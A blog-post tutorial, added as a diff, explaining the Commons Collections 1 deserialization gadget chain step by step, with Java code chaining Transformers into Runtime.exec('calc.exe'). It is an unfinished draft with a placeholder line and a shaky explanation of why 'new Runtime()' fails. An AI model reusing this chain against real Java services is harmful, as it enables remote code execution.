@@ -1,0 +1,298 @@
+---
+layout: default
+---
+<html>
+<body>
+
+<p>So Before we start Learning CommonsCollection1 there are certain Concepts we should Learn.<br><br>
+    The trnasformer.<br><br><br>
+    In  layman language these are functions which takes an input transfomrs it and produces an output.<br><br><br>
+Few are:
+    </p>
+
+
+<ol>
+    <li>InvokerTransFormer</li>
+    <li>ConstantTransformer</li>
+    <li>ChainedTransFormer</li>
+</ol>
+<p>We will dicuss how the CommonsCollection1 payload works and we will pop a calculator withour own code file without using the ysoerial.</p>
+<p>We will discuss how exactly the serilized data gets created in ysorial in another post.</p>
+
+<P>SO lets start with ConstantTransformer</P>
+<h3>ConstantTransformer</h3>
+<p>
+    In case of  ConstantTransformer Once it's initialised with something no matter what you send to transform , it always returns the one that it has been initialised with.<br>
+    Take below code for an example.
+</p>
+<p><code>ConstantTransformer transformer = new ConstantTransformer("HelloWorld");
+    System.out.println(transformer.transform(123)); //Outouts HelloWorld and the return type Java.lang.String</code></p>
+So we have instntiated the ConstantTransformer with the String "Helloworld".
+So even if we pass 123 to the transform method the value it will return is still gogin to be "HelloWorld"
+<p>
+    <img src="CONSTANTTRANSFROMERINITWORKING">
+</p>
+
+<h3>InvokerTransFormer</h3>
+<p>InvokerTransFormer takes 3 arguments</p>
+<ul>
+    <li>First One: Name of a method</li>
+    <li>2nd one the type of parameters passed</li>
+    <li>The Value you want to the pass to those method</li>
+</ul> 
+<p> Take below code for an example.</p>
+<code>Person pt=new Person()
+    InvokerTransformer transformer = new InvokerTransformer("nice",new Class[]{String.class},new String[]{"YES"});
+    System.out.println(transformer.transform(pt)) //Outputs Yes</code>
+<p>The above code will find the function on Person Class whose name is nice and it takes one Parameter of string type and the value its going to pass is "YES"<br>
+
+    The Person class looks something like below</p>
+    <code>
+        public class Person {
+
+            public String nice(String a){
+                return a.toUpperCase();
+            }
+        }
+    </code>
+<p>So the Output of the code will be "YES"</p>
+<p>
+    <img src="INVOKERINITOUTPUT">
+</p>
+
+<p>So inshort invokerTransformer is used to invoker certain Method.</p>
+<p>It uses Java's Reflection to Invoker Those methods</p>
+<h3>ChainedTransFormer</h3>
+<p>This transformer as the name suggest chains multiple transformer.<br>
+    Meaning it takes the output of the first Transformer and passes it as the argument of the 2nd TransFormer.</p>
+    <p>So it takes an Input as array of TransFormers</p>
+    <code>ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });</code>
+    <p>Where constant and instantiate are the name if the Transformers</p>
+    <p>The transfomr() of ChainedTransformer will take the argument required by the first Transformer of the TransFormer of the TransFormer array in our cas it will be ConstantTransformer </p>
+    <p>
+        <img src="CHAINEDINITOUTPUT">
+    </p>
+    
+    <p>So lets get into Payload</p>
+    <pre><code>public class CommonsCollections1PayloadOnly {<br>
+        public static void main(String... args) {<br>
+            String[] command = {"calc.exe"};<br>
+            final Transformer[] transformers = new Transformer[]{<br>
+                    new ConstantTransformer(Runtime.class), //(1)<br>
+                    new InvokerTransformer("getMethod",<br>
+                            new Class[]{ String.class, Class[].class},<br>
+                            new Object[]{"getRuntime", new Class[0]}<br>
+                    ), //(2)<br>
+                    new InvokerTransformer("invoke",<br>
+                            new Class[]{Object.class, Object[].class},<br>
+                            new Object[]{null, new Object[0]}<br>
+                    ), //(3)<br>
+                    new InvokerTransformer("exec",<br>
+                            new Class[]{String.class},<br>
+                            command<br>
+                    ) //(4)<br>
+            };<br>
+            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);<br>
+            Map map = new HashMap<>();<br>
+            Map lazyMap = LazyMap.decorate(map, chainedTransformer);<br>
+            lazyMap.get("Swagat");<br>
+        }<br>
+    }</code></pre>
+
+<p>The ideal goal is to execute Runtime.getRuntime().exec(Command)</p>
+<p>At [1] we are instntiating the ConstantTransformer with Runtime.class</p>
+<p>So no matter what we pass to it's transform() it will rerutn the Runtime.class</p>
+<p>At [2] we are invoking the getMethod() via invokerTransformer and passing 2 more things</p>
+<ul><li>A class array of String.class and Class[].class</li>
+<li>An Object Array of "getRuntime" and and blnk object element</li></ul>
+<p>At [3] we are invking the "invoke" method and again passing couple of args</p>
+<p>Finally at [4] we are invoking the exec() and passing our Command</p>
+
+<p>Now lets Try to understand the above with couple of Questions</p>
+
+
+<p>
+    Before that lets just simplyfy the above code
+</p>
+<pre>
+    <code>ConstantTransformer tr=new ConstantTransformer(Runtime.class);
+        InvokerTransformer transformer = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]});
+        InvokerTransformer tr3=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]});
+        InvokerTransformer tr4=new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});
+        System.out.println(transformer.transform(Runtime.class).getClass().getName());
+        System.out.println(tr4.transform(tr3.transform(transformer.transform(Runtime.class))));</code>
+</pre>
+<p>If you last line we are taking the out of the first Transfromer and passing it as an input for the next transFormer.<br>
+    This is exactly what chainedTransfromer will do.</p>
+
+
+<p>Why do we need these?</p>
+<p>TO understand the need of all these transformer and the exact sequence , let deep dive in to the TransFormer's code and understand how it works.</p>
+<div>
+    <h3>InvokerTransFormer</h3>
+    <img src="images/InvokerTransFormer_class.png">
+    <p>The Below code shows the constuctor of the InvokerTransformer that will get called when class is being initialized.</p>
+    <pre><code> public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
+        this.iMethodName = methodName;
+        this.iParamTypes = paramTypes;
+        this.iArgs = args;
+      }</code></pre>
+So the above code takes the MethodName , Class array of paramTypes and Object[] of args.
+<p>When we call the TransForm Method defined at line 119 It uses Reflection to Invoke The Method Provided By Us.(If this looks foregin to you, i would recommed to Go thorugh Reflection Trainning and then Comback)</p>
+<p>This Means Using InvokerTransFormer We can Invoke Any method Present in the Class Path</p>
+
+<p>So can we Invoke Runtime.getRuntime().exec() ?</p>
+<p>Answer is Yes, but its not Straight Forward.</p>
+<p>But lets Try to do that and see what happens</p>
+<p>Checkout the Below Image</p>
+<img src="Invoking RUntime.getRuntime().exec() Via InvokerTransformer Only">
+<p>As you can see from the output we got the Error that</p>
+<FILL IT WITH THE ERROR AND CONTINUE THIS>
+
+<p>So the reason we are having this Trouble is in Runtime.class the getRuntime() is defined as a static Method.</p>
+<p>When we are calling Static Method we canot call it from an object of the class but we have to call it on class meaning className.MethodName(). So in out case we can only do it via Runtiem.getRuntime()</p>
+<p>IF we try to create an Object of Runtime() and call the getRuntime() it will thorugh a compile TIme Error</p>
+<p>Try Running the Below Code</p>
+<pre><code>Runtime rt=new Runtime();
+    rt.getRuntime().exec("calc.exe");</code></pre>
+
+Excellent,
+So we know why we neeed InvokerTransFormer, but what about ConstantTransFormer?
+<p>TO solve the Problem we faced Above we need ConstantTransFormer.</p>
+<P>Remeber the Property of Constant TransFormer?</P>
+<p>Once its instantiated it can not be Changed without the use of Reflection Explicilty.</p>
+<p>So that is why we use ConstantTransFormer and passing Runtime.class in there.</p>
+
+<P>But why are we looking for getMethod inside Runtime.class(So the output of the COnstantTransFormer will be input for the InvokerTransFormer, so the class searching is going to happen in the return value of ConstantTransFormer's tansform())?<br>
+And why we even need the "invoke"?</P>
+<p>Thats a good catch.</p>
+<p>Runtime.class doesn't even have the getMethod()</p>
+<p>Lets Check what does the ConstantTransFormer's transform() returns </p>
+<pre><code>
+    import java.util.ArrayList;
+    import java.util.HashMap;
+    import java.util.List;
+    import java.util.Map;
+    import java.util.HashMap;
+    
+    import javax.xml.transform.Transformer;
+    
+    import org.apache.commons.collections.functors.*;
+    
+    public class testing {
+    
+    
+        public static void main(String args[]){
+    
+    
+    
+    
+        ConstantTransformer tr=new ConstantTransformer(Runtime.class);
+        InvokerTransformer transformer = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]});
+        System.out.println(tr.transform("RANDOMESTRING").getClass().getName());
+        }
+    }
+</code></pre>
+<img src="images/ReturnValueOfConstantTransformer.PNG">
+<p>As you can see the retunr Value is not java.lang.Runtime but its java.lang.Class</p>
+<p>Reason is when ever we pass a class to ConstantTransFormer it retunrs the Class.class (This Class Exist on JDK)</p>
+<P>Now this class Doesn't have a function called getRuntime() and neither we can call it, however this calss have a function called getMethod() that uses the releection to find a method</P>
+<p>And the Input to this function is of type String and varargs of class and hence we have passed String.class and blank Class[] and the values we want is getRuntime()</p>
+<p>This method will then use the reflection to find the getRuntime on Runtime.class</p>
+
+<p>Cool , so now its clear why we need these 2 things but what about the invoke?</p>
+<p>We need invoke Method cause inorder for us to call the getRuntime() on runtime.class we have call it via what called "calling on the class" due to getRuntime() being static</p>
+<p>So when we call the invoke method an instance of Runtime.class gets returned so that we can call the exec() on it</p>
+
+<p>But the class.class doesn't have the Invoke() defined.</p>
+<p>That is correct, the InvokerTransformer's transform() method return java.lang.reflect.Method and the invoke() is defined on there </p>
+<p>So once we call the invoke Method we get the Runtime.getRuntime()@</p>
+<p>
+    <pre>
+        <code>
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+import java.util.HashMap;
+
+import javax.xml.transform.Transformer;
+
+import org.apache.commons.collections.functors.*;
+
+public class testing {
+
+
+    public static void main(String args[]){
+
+        ConstantTransformer tr=new ConstantTransformer(Runtime.class);
+        InvokerTransformer transformer = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]});
+        InvokerTransformer tr3=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]});
+        System.out.println(tr.transform("RANDOMSTRING").getClass().getName());
+        System.out.println(transformer.transform(Runtime.class).getClass().getName());
+        System.out.println(tr3.transform(transformer.transform(Runtime.class)).getClass().getName());
+    }
+}
+        </code>
+    </pre>
+</p>
+<img src="images/reachedToRuntime.PNG">
+
+<p>So now we have the java.lang.Runtime and we can now call the exec() on it and that what we are doing at the end</p>
+<p>And as always we passing the new Class[]{String.class} and new String[]{"calc.exe"} as this is what exec function needs interms of invokerTransformer</p>
+<p>So now if we execute the below code we will have our calculator poped up.</p>
+<p>
+    <pre>
+        <code>
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+import java.util.HashMap;
+
+import javax.xml.transform.Transformer;
+
+import org.apache.commons.collections.functors.*;
+
+public class testing {
+
+
+    public static void main(String args[]){
+
+
+
+
+    ConstantTransformer tr=new ConstantTransformer(Runtime.class);
+    InvokerTransformer transformer = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]});
+    InvokerTransformer tr3=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]});
+    InvokerTransformer tr4=new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});
+    System.out.println(tr.transform("RANDOMSTRING").getClass().getName());
+    System.out.println(transformer.transform(Runtime.class).getClass().getName());
+    System.out.println(tr3.transform(transformer.transform(Runtime.class)).getClass().getName());
+    System.out.println(tr4.transform(tr3.transform(transformer.transform(Runtime.class))).getClass().getName());
+    
+    }
+}
+
+
+
+        </code>
+    </pre>
+</p>
+<p>
+    <img src="images/calculatorpopedUp.PNG">
+</p>
+</div>
+<p>So this is how commons Collection1 Gadget Works</p>
+<p><i>Note: we will read About the LazyMap and the Proxies while we learn on Gadget Builing, For now we will just learn how exactly the paylod works</i></p>
+
+
+<p>Thats it for Today.</p>
+<p>Thanks For Reading.</p>
+<p>Happy Hacking.</p>
+<p>You can connect with me at:</p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+</body>
+</html>
